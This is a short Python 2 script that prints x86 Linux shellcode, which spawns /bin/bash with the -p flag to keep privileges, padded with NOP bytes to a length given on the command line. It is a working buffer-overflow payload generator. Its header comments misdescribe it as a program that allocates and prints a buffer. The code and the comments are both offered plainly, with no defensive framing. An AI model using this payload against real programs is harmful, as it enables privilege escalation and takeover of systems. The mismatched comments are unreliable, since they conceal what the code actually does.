
#
#The program takes a single argument from the command line, which is the size of the buffer to allocate.
#The program allocates a buffer of the specified size.
#The program prints the contents of the buffer.
#The program exits.
#
#The program is vulnerable to a buffer overflow attack.
#
#The program is vulnerable to a buffer overflow attack because it does not check the size of the input before copying it into the buffer.
#
#


import sys

def main(argv):
    buf = ""
    buf += "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
    buf += "\x90" * (int(sys.argv[1]) - len(buf))
    print buf

if __name__ == "__main__":
    main(sys.argv)

